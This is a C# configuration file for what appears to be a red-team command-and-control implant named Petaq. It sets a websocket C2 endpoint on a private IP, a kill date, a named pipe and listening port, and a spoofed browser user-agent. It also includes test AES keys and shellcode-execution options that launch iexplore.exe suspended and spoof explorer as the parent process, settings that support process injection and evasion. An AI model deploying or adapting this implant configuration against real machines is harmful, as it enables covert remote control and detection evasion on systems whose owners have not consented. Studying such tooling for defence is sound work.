using System;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections;
using System.Collections.Generic;

namespace PetaqImplant
{
    public static class Configuration
    {

        public static void InitConfiguration()
        {
            // building implant Program.configuration for Implant ID
            Program.configuration.Add("ID", "NOTINUSE");
            Program.configuration.Add("KILL_DATE", "1/3/2020 00:00:00");
            // C2 communication options
            Program.configuration.Add("C2PROTO", "websocket");
            Program.configuration.Add("C2CONF", "ws://172.16.121.1/ws");
            Program.configuration.Add("NAMEDPIPE", "petaq_namedpipe");
            Program.configuration.Add("LISTENPORT", "8005");
            Program.configuration.Add("UA", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12");
            Program.configuration.Add("RECONNECT_DELAY", "5000"); // Unused 1000 = 1sec
            // Implant and session information
            Program.configuration.Add("IMPLANT_TYPE", "powershell");
            // Used for encrypted communications - AES Key and IV
            // Make sure PetaqService also uses the same keys (Program.cs)
            // In future this will change with TLS communications
            Program.configuration.Add("SESSION_KEY", "Petaq-TestSessionKey");
            Program.configuration.Add("SESSION_IV", "Petaq-TestSessionIV");
            // Shellcode execution options
            Program.configuration.Add("PROCESS_TO_CREATESUSPENDED", @"C:\Program Files\Internet Explorer\iexplore.exe");
            Program.configuration.Add("PROCESS_AS_PARENT", "explorer");
        }
    }
}
